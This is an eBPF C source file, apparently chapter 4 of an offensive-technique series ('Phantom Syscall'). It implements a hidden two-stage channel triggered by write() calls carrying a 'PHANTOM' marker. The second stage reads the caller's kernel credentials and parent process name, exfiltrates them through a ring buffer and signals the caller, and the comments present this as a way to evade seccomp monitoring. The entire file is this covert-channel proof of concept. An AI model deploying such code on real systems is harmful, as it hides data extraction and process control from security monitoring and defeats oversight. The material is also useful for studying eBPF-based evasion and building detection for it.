// Ch04 Phantom Syscall — write() with magic marker is the ONLY syscall
// userspace issues; tracepoint + tail-call into stage 2 reads kernel-side
// creds/task info and exfils via ringbuf. Seccomp sees only write().
//
// REAL EFFECT: in addition to exfiltration, stage 2 sends SIGUSR1 back
// to the calling process via bpf_send_signal, proving BIDIRECTIONAL
// control — the BPF can both extract data FROM and inject signals INTO
// the target, all triggered by a single write() syscall.
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

char LICENSE[] SEC("license") = "GPL";

#define SIGUSR1 10

struct evt {
    unsigned int pid, tgid, uid, euid;
    char comm[16];
    char parent_comm[16];
    char payload[32];
    int signal_sent;    // 1 if SIGUSR1 was sent back to caller
};

struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 1 << 18);
} events SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_PROG_ARRAY);
    __uint(max_entries, 4);
    __type(key, unsigned int);
    __type(value, unsigned int);
} jumps SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_PERCPU_ARRAY);
    __uint(max_entries, 1);
    __type(key, unsigned int);
    __type(value, struct evt);
} scratch SEC(".maps");

SEC("tp/syscalls/sys_enter_write")
int phantom_stage1(struct trace_event_raw_sys_enter *ctx)
{
    const char *buf = (const char *)ctx->args[1];
    size_t len = (size_t)ctx->args[2];
    if (len < 8) return 0;
    char magic[8] = {};
    if (bpf_probe_read_user(&magic, 8, buf) < 0) return 0;
    if (!(magic[0]=='P' && magic[1]=='H' && magic[2]=='A' && magic[3]=='N' &&
          magic[4]=='T' && magic[5]=='O' && magic[6]=='M'))
        return 0;

    unsigned int z = 0;
    struct evt *e = bpf_map_lookup_elem(&scratch, &z);
    if (!e) return 0;
    __builtin_memset(e, 0, sizeof(*e));
    unsigned long id = bpf_get_current_pid_tgid();
    e->pid = id & 0xffffffff;
    e->tgid = id >> 32;
    bpf_get_current_comm(&e->comm, sizeof(e->comm));

    // copy payload (post-magic) from user
    unsigned int plen = len - 8;
    if (plen > sizeof(e->payload) - 1) plen = sizeof(e->payload) - 1;
    bpf_probe_read_user(&e->payload, plen, buf + 8);

    bpf_tail_call(ctx, &jumps, 0);
    return 0;
}

SEC("tp/syscalls/sys_enter_write")
int phantom_stage2(struct trace_event_raw_sys_enter *ctx)
{
    unsigned int z = 0;
    struct evt *s = bpf_map_lookup_elem(&scratch, &z);
    if (!s) return 0;

    struct task_struct *t = (struct task_struct *)bpf_get_current_task();
    const struct cred *cred = BPF_CORE_READ(t, cred);
    s->uid  = BPF_CORE_READ(cred, uid.val);
    s->euid = BPF_CORE_READ(cred, euid.val);
    struct task_struct *p = BPF_CORE_READ(t, real_parent);
    bpf_probe_read_kernel_str(&s->parent_comm, sizeof(s->parent_comm),
                               BPF_CORE_READ(p, comm));

    // REAL EFFECT: send SIGUSR1 back to the calling process to prove
    // bidirectional control through a single write() syscall.
    s->signal_sent = 0;
    int sig_err = bpf_send_signal(SIGUSR1);
    if (sig_err == 0)
        s->signal_sent = 1;

    struct evt *e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
    if (!e) return 0;
    __builtin_memcpy(e, s, sizeof(*e));
    bpf_ringbuf_submit(e, 0);
    return 0;
}
